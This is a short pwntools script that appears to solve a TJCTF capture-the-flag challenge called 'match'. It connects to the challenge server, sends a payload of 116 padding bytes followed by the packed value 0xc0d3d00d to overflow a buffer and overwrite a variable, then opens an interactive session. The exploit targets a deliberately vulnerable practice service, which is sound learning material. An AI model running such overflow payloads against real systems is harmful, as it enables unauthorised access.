from pwn import *
r=remote('p1.tjctf.org', 8002)
#r=process("./match")

pay=""
pay+='x'*116
pay+=p32(0xc0d3d00d)


r.sendline('name')
r.sendline('username')
r.sendline('password')
r.sendline(pay)

r.interactive()
